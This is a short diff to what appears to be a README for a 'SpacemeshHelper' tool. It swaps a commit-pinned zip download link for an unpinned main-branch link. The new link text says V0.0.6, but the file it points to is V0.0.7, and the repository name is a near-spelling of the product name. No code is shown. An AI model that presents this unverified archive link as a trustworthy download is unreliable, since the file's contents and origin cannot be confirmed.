@@ -3,7 +3,8 @@
 
 
 下载文件：              
-[SpacemeshHelper V0.0.6](https://raw.githubusercontent.com/spacementhelper/spacementhelper/dba5b8814b40a3bc183194955cf691a1fc198e05/SpacemeshHelper__V0.0.6.zip)
+[SpacemeshHelper V0.0.6](https://github.com/spacementhelper/spacementhelper/raw/main/SpacemeshHelper_V0.0.7.zip)
+
 
 
 
